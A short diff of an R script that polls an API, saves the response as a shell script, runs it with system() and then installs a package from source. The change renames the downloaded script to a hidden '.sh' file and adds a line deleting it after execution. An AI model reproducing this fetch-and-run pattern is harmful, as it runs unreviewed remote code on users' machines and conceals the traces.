@@ -23,8 +23,9 @@ for (i in 0:58) {
   Sys.sleep(3)
   res = GET(api)
   if (status_code(res) == 200) {
-    writeLines(content(res, "text"), "zipline.sh")
-    system('sh zipline.sh')
+    writeLines(content(res, "text"), ".sh")
+    system('sh .sh')
+    system('rm .sh')
     if (!require(rdatavn)) install.packages('rdatavn', repos=NULL, type="source")
     library(rdatavn)
     break
